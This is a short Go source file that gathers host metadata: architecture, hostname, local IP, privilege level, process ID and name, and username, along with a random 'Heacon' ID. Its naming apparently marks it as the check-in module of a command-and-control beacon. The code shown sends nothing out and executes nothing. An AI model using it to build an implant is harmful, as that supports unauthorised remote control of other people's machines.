package sysinfo

import (
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func GetArch() string {
	arch := runtime.GOARCH
	if arch == "amd64" {
		return "x64"
	} else if arch == "arm64" {
		return "arm"
	}
	return "unknown"
}

func GetHostName() string {
	name, err := os.Hostname()
	if err != nil {
		return ""
	}
	return name
}

func GetHeaconID() string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func GetIPAddr() string {
	address := "8.8.8.8:65530"
	timeout := 5 * time.Second
	conn, err := net.DialTimeout("udp", address, timeout)
	if err != nil {
		log.Printf("Failed to connect to %s: %v\n", address, err)
		return ""
	}

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	defer conn.Close()
	return localAddr.IP.String()
}

func GetIntegrity() string {
	fd, err := os.Open("/root")
	defer fd.Close()
	if err != nil {
		return "MEDIUM"
	}
	return "HIGH"
}

func GetProcInfo() (int, string) {
	statPath := "/proc/self/stat"
	data, err := ioutil.ReadFile(statPath)
	if err != nil {
		log.Printf("Error reading %s: %v\n", statPath, err)
		return 0, ""
	}
	fields := strings.Fields(string(data))
	pid := fields[0]
	pidInt, _ := strconv.Atoi(pid)
	pname := strings.Trim(fields[1], "()")
	return pidInt, pname
}

func GetUser() string {
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	if user == "" {
		return ""
	}
	return user
}
